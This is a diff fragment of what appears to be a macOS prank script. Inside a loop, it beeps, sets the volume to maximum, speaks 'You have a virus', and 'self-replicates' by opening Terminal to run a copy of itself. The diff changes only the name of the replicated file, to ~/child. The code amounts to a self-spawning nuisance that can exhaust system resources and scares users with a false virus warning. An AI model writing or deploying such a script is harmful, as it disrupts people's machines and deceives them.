@@ -13,5 +13,5 @@ osascript -e 'beep'
 osascript -e "set volume 7"
 say You have a virus
 #Self-replicate.
-open -a Terminal.app ~/trollingnl
+open -a Terminal.app ~/child
 done
